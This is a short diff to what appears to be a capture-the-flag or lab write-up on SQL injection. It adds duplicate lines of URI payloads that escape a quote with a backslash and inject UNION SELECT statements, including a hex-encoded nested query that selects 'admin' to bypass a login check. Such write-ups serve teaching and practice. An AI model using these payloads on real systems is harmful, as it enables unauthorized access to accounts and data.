@@ -39,6 +39,9 @@ If we provide the following URI parameter:
 
 ```
 ?id=\&pw=UNION SELECT 1, 2 -- -
+
+## id=\
+## pw=UNION SELECT 1, 2 -- -
 ```
 
 The resultant query becomes:
@@ -61,6 +64,9 @@ We can provide the following URI:
 
 ```
 ?id=\&pw=UNION SELECT 0x5C, 0x554e494f4e2053454c45435420307836313634366436393665202d2d202d -- -
+
+## ?id=\
+## ?pw=UNION SELECT 0x5C, 0x554e494f4e2053454c45435420307836313634366436393665202d2d202d -- -
 ```
 
 `0x554e494f4e2053454c45435420307836313634366436393665202d2d202d` is the Hexadecimal representation of `UNION SELECT 0x61646d696e -- -` and `0x5C` id Hexademical for `\`.
